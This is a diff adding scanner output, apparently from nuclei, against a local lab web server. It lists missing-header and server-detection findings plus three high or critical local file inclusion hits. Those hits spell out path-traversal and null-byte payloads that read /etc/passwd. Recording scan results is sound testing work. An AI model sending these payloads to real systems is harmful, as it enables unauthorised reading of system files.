@@ -1,0 +1,17 @@
+[waf-detect:apachegeneric] [http] [info] http://192.168.1.9:60080
+[generic-linux-lfi] [http] [high] http://192.168.1.9:60080/index.php?page=../../etc/passwd [paths="/index.php?page=../../etc/passwd"]
+[rsync-list-modules] [javascript] [low] 192.168.1.9:60080 ["<!DOCTYPE  HTML  PUBLIC  "-//IETF//DTD  HTML  2.0//EN">  <html><head>  <title>400  Bad  Request</title>  </head><body>  <h1>Bad  Request</h1>  <p>Your  browser  sent  a  request  that  this  server  could  not  understand.<br  />  </p>  <hr>  <address>Apache/2.4.18  (Ubuntu)  Server  at  127.0.0.1  Port  60080</address>  </body></html>"]
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.1.9:60080
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.1.9:60080
+[apache-detect] [http] [info] http://192.168.1.9:60080 ["Apache/2.4.18 (Ubuntu)"]
+[sl-studio-lfi] [http] [high] http://192.168.1.9:60080/index.php?page=../../../../../../../../../../etc/passwd
+[CVE-2020-29227] [http] [critical] http://192.168.1.9:60080/index.php?page=/etc/passwd%00
